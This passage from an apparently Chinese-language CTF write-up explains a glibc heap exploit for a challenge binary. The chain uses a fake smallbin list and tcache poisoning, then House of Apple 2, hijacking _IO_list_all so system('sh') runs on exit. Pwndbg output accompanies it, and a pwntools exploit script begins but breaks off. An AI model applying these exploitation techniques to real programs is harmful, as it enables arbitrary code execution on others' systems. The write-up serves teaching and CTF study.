+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xd58</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span> <span class="c1"># arrange heap layout. '3' is a valid size. take effect in line 74
+</span></code></pre></div></div>
+
+<p>这个神秘的偏移可以通过动态调试拿到。这个’3’也就是 fake chunk 的 size 位。</p>
+
+<p>在解决了后向合并问题之后，我们还需要考虑前向合并问题。显然，只要释放堆块的 PREV_IN_USE bit 是 1，那 <code class="language-plaintext highlighter-rouge">free()</code> 就不会尝试合并前面的堆块。</p>
+
+<p>于是我们可以写出第一个版本的代码：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xd01</span><span class="p">))</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="p">)</span> <span class="c1"># tcache do not care how large the chunk it gives out (0xd01)
+</span><span class="n">free</span><span class="p">()</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>
+<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger malloc to the big-unsorted-bin-loop and put the fake chunk into small bin
+</span></code></pre></div></div>
+
+<p>在最后一个 <code class="language-plaintext highlighter-rouge">free()</code> 之前，位于 unsorted bin 中的那个目标堆块信息如下：</p>
+
+<pre><code class="language-pwndbg">pwndbg&gt; bins
+tcachebins
+empty
+fastbins
+empty
+unsortedbin
+all: 0x56cefdc442f0 —▸ 0x56cefdc44380 —▸ 0x702f51e19ce0 (main_arena+96) ◂— 0x56cefdc442f0
+smallbins
+empty
+largebins
+empty
+
+pwndbg&gt; malloc_chunk 0x56cefdc442f0
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x56cefdc442f0
+Size: 0x90 (with flag bits: 0x91)
+fd: 0x56cefdc44380
+bk: 0x702f51e19ce0
+
+pwndbg&gt; malloc_chunk 0x56cefdc442f0+0x90
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x56cefdc44380
+Size: 0xc60 (with flag bits: 0xc61)
+fd: 0x702f51e19ce0
+bk: 0x56cefdc442f0
+</code></pre>
+
+<p>然而，如果运行这段代码，会发现我们没有通过位于 unsorted bin 循环中的检测，也就是 top chunk 之后那两个哨兵堆块想要解决的那些检测。具体来说，我们想要放入 small bin 中的那个堆块之后的堆块（也就是 0x56cefdc442f0+0x90），其 PREV_INUSE bit 是 1，这就不能通过 <code class="language-plaintext highlighter-rouge">malloc()</code> 的检查。</p>
+
+<p>为了通过这个检查，EXP 采用的方法也很精彩：在将目标堆块释放进入 unsorted bin 的时候，在其之前构造一个 fake chunk 并触发两个堆块的合并，从而将目标堆块起始位置前移。这样一来，我们就有机会在目标堆块+0x90 的位置提前布置好两个哨兵堆块。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="o">*</span><span class="n">pack</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xd00</span><span class="p">))</span> <span class="c1"># fake chunk to be consolidated with target chunk
+</span><span class="n">free</span><span class="p">()</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x50</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x11</span><span class="p">))</span> <span class="c1"># 2 guard fake chunk
+</span><span class="n">free</span><span class="p">()</span> <span class="c1"># trigger a consolidate with the 0x31 fake chunk in chunk-0x40, now we have a fake chunk in unsorted bin
+</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>
+<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger malloc to the big-unsorted-bin-loop and put the fake chunk in chunk-0x40 into small bin
+</span></code></pre></div></div>
+
+<p>此时各个 bin 的状态：</p>
+
+<pre><code class="language-pwndbg">pwndbg&gt; bins
+tcachebins
+empty
+fastbins
+empty
+unsortedbin
+all: 0x5fb67444a380 —▸ 0x7978dba19ce0 (main_arena+96) ◂— 0x5fb67444a380
+smallbins
+0x90: 0x5fb67444a2c0 —▸ 0x7978dba19d60 (main_arena+224) ◂— 0x5fb67444a2c0
+largebins
+empty
+</code></pre>
+
+<p>可以看到，我们已经成功把一个堆块送入了 small bin。接下来就可以通过溢出来伪造一条 smallbin 的 bk 链表了。这里我们就伪造出一条有三个堆块的链表，以备后续使用。（不能再多了）</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># construct a fake smallbin-linked list
+</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span>
+    <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x40</span><span class="p">,</span>
+    <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x219d60</span><span class="p">,</span>
+<span class="p">]))</span>
+<span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>此时，smallbin 数据如下：</p>
+
+<pre><code class="language-pwndbg">smallbins
+0x90 [corrupted]
+FD: 0x5df1191ee2c0 ◂— 0x5df1191ee2c0
+BK: 0x5df1191ee2c0 —▸ 0x5df1191ee2e0 —▸ 0x5df1191ee300 —▸ 0x74294ce19d60 (main_arena+224) ◂— 0x5df1191ee2c0
+</code></pre>
+
+<p>虽然 FD 链表和 BK 链表完全对不上，但是 malloc 在从 smallbin 取区块的过程中，都是以 bk 进行迭代的。我们接下来调用 <code class="language-plaintext highlighter-rouge">malloc(0x80)</code> ，就可以触发 smallbin to tcache 的过程：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span> <span class="c1"># trigger smallbin-to-tcache process
+</span><span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>此时各个 bin 状态如下：</p>
+
+<pre><code class="language-pwndbg">tcachebins
+0x50 [  1]: 0x61618d6c42b0 ◂— 0x0
+0x90 [  3]: 0x61618d6c42d0 —▸ 0x61618d6c4310 —▸ 0x61618d6c42f0 ◂— 0x0
+fastbins
+empty
+unsortedbin
+all [corrupted]
+FD: 0x61618d6c4380 —▸ 0x7f82b3e19ce0 (main_arena+96) ◂— 0x61618d6c4380
+BK: 0x61618d6c4380 —▸ 0x7f82b3e19ce1 (main_arena+97) ◂— 0xf0000061618d6c43
+smallbins
+empty
+largebins
+empty
+</code></pre>
+
+<h3 id="tcache-poisoning--house-of-apple2">tcache poisoning &amp; House of Apple2</h3>
+
+<p>由于可以进行溢出，我们已经可以进行 tcache poisoning 了，拥有一次任意写 0x90 字节的原语。接下来就可以通过各种方法将任意写扩大成为控制流劫持，这里我们就使用 House of Apple 2 进行攻击。关于这个手法，推荐参考 <a href="https://pwn.college/software-exploitation/file-struct-exploits">pwn.college 的 IOFILE 章节</a>。</p>
+
+<p>注意到，0x90 字节小于一个完整的 <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code> 结构体大小。因此，如果直接尝试修改标准流的 FILE 结构体的话，是无法做到又改到 flag 又改到 vtable 指针的。</p>
+
+<p>所以我们可以先在堆上伪造一个 <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code> 结构体，然后劫持 <code class="language-plaintext highlighter-rouge">_IO_list_all</code> 到我们的 fake FILE 结构体。我劫持的 vtable 函数是 <code class="language-plaintext highlighter-rouge">__overflow</code> ，这样会在程序退出时触发攻击。（<code class="language-plaintext highlighter-rouge">exit -&gt; ... -&gt; _IO_flush_all_lockp -&gt;_IO_overflow</code>）</p>
+
+<p>首先调试拿到一些偏移：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wide_data_off</span> <span class="o">=</span> <span class="mh">0xa0</span> <span class="c1"># wide data field in _IO_FILE
+</span><span class="n">vtable_off</span> <span class="o">=</span> <span class="mh">0xd8</span> <span class="c1"># vtable field in _IO_FILE
+</span><span class="n">wide_data_vtable_off</span> <span class="o">=</span> <span class="mh">0xe0</span> <span class="c1"># vtable field in wide_data FILE structure
+</span>
+<span class="n">_IO_wfile_overflow_ptr</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x2160d8</span> <span class="c1"># _IO_wfile_overflow address
+</span><span class="n">__overflow_off</span> <span class="o">=</span> <span class="mh">0x18</span> <span class="c1"># overflow field offset in vtable
+</span><span class="n">do_alloc_off</span> <span class="o">=</span> <span class="mh">0x68</span> <span class="c1"># do_alloc field offset in wide_data vtable
+</span>
+<span class="n">_IO_list_all</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a680</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x50d60</span>
+</code></pre></div></div>
+
+<p>然后开始进行攻击。</p>
+
+<p>首先，溢出修改目前正位于 <code class="language-plaintext highlighter-rouge">tcache[0x90]</code> 最前面的堆块，将其 size 改小，fd 修改成该堆块+0x70 的位置。这里把 size 改小是为了之后使用完该堆块将其释放时，可以把该堆块放入另外的 tcache bin。而之所以 fd 是加 0x70，是因为这样我们在写入该堆块的时候，可以顺便设置位于 0x70 处（0x70~0x78）的 fd 指针，通过这种方式完成第二次 tcache poisoning。（这里说是 poisoning 其实不太准确，因为这里本来就没有 fd 指针，是一个完全的 fake chunk）</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># heap_base + 0x2d0 is the chunk_0x80(content), heap_base + 0x2c0 is the chunk_0x40(content)
+</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2d0</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)))</span>
+<span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>然后，我们申请出刚才修改的这个堆块，在其中填入 IOFILE 结构体，顺便设置 fake chunk 的 fd 指针到 <code class="language-plaintext highlighter-rouge">_IO_list_all</code>。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span>
+    <span class="mh">0x00</span><span class="o">+</span><span class="mh">0x10</span><span class="p">:</span> <span class="sa">b</span><span class="s">"  sh;"</span><span class="p">,</span> <span class="c1"># fake FILE struct starts at heap_base + 0x2e0
+</span>    <span class="mh">0x28</span><span class="o">+</span><span class="mh">0x10</span><span class="p">:</span> <span class="n">system</span><span class="p">,</span>
+    <span class="mh">0x58</span><span class="o">+</span><span class="mh">0x10</span><span class="p">:</span> <span class="mh">0x71</span><span class="p">,</span>
+    <span class="mh">0x60</span><span class="o">+</span><span class="mh">0x10</span><span class="p">:</span> <span class="n">_IO_list_all</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">),</span>
+<span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">))</span>
+<span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>接着我们申请出来的就是 0x70 偏移处的 fake chunk 了，可以在其中继续伪造 IOFILE 结构体。（注意我把 unused 的部分用来存放 widedata 的 vtable 指针）</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span> <span class="c1"># starts from heap_base + 0x2e0 + 0x60
+</span>    <span class="n">wide_data_off</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e0</span> <span class="o">+</span> <span class="mh">0xd0</span> <span class="o">-</span> <span class="n">wide_data_vtable_off</span><span class="p">,</span>
+    <span class="mh">0xd0</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span>          <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e0</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="o">-</span> <span class="n">do_alloc_off</span><span class="p">,</span> <span class="c1"># `unused` in IOFILE
+</span>    <span class="n">vtable_off</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span>    <span class="n">_IO_wfile_overflow_ptr</span> <span class="o">-</span> <span class="n">__overflow_off</span><span class="p">,</span>
+<span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>最后，我们把 <code class="language-plaintext highlighter-rouge">_IO_list_all</code> 申请出来并填上 fake IOFILE 结构体的地址，再触发程序退出，就可以拿到 shell。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e0</span><span class="p">))</span>   <span class="c1"># hijack _IO_list_all
+</span><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span> <span class="c1"># trigger exit -&gt; ... -&gt; _IO_flush_all_lockp -&gt;_IO_overflow
+</span></code></pre></div></div>
+
+<h2 id="exp-脚本">EXP 脚本</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
+
+<span class="c1"># ---------------- Environment Config ---------------- #
+</span>
+<span class="c1">#context.log_level = 'debug'
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>
+
+<span class="c1"># ------------------- Exploitation ------------------- #
+</span>
+<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span>       <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size [1=small / 2=big]: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Data: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+ 
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+ 
+<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xd58</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span> <span class="c1"># arrange heap layout (very very niu bi trick) '3' is a valid size. take effect in line 74
+</span>
+    <span class="c1"># leak libc and heap
+</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd11</span><span class="p">))</span> <span class="c1"># top chunk origin size: 0x??D11
+</span>    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger realloc to put top chunk into unsorted bin (very niu bi trick)
+</span>    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span>
+    <span class="n">show</span><span class="p">()</span>
+    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
+    <span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcf1</span><span class="p">))</span> <span class="c1"># repair corrupted size
+</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span> <span class="c1"># this chunk is split from old top chunk in unsorted bin
+</span>    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span>
+    <span class="n">show</span><span class="p">()</span>
+    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="c1"># leak tcache protect key (which xswl)
+</span>    <span class="n">success</span><span class="p">(</span><span class="s">"heap_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+    <span class="n">free</span><span class="p">()</span>
+
+    <span class="c1"># smallbin to tcache
+</span>
+    <span class="c1"># construct fake chunk to be consolidate with old top chunk (need to satisfy unlink macro)
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="o">*</span><span class="n">pack</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xd00</span><span class="p">))</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x50</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x11</span><span class="p">))</span> <span class="c1"># taken from tcache, but actually a very big chunk (0xd00) overlaping with the old top chunk which is in unsorted bin
+</span>    <span class="n">free</span><span class="p">()</span> <span class="c1"># trigger a consolidate with the 0x31 fake chunk in chunk-0x40, now we have a fake chunk in unsorted bin
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>
+
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger malloc to the big-unsorted-bin-loop and put the fake chunk in chunk-0x40 into small bin
+</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="c1"># construct a fake smallbin-linked list
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x40</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x219d60</span><span class="p">,</span>
+    <span class="p">]))</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span> <span class="c1"># trigger smallbin-to-tcache process
+</span>    <span class="n">free</span><span class="p">()</span>
+
+    <span class="c1"># House of Apple 2
+</span>
+    <span class="n">wide_data_off</span> <span class="o">=</span> <span class="mh">0xa0</span>
+    <span class="n">vtable_off</span> <span class="o">=</span> <span class="mh">0xd8</span>
+    <span class="n">wide_data_vtable_off</span> <span class="o">=</span> <span class="mh">0xe0</span>
+    <span class="n">_IO_wfile_overflow_ptr</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x2160d8</span>
+    <span class="n">__overflow_off</span> <span class="o">=</span> <span class="mh">0x18</span>
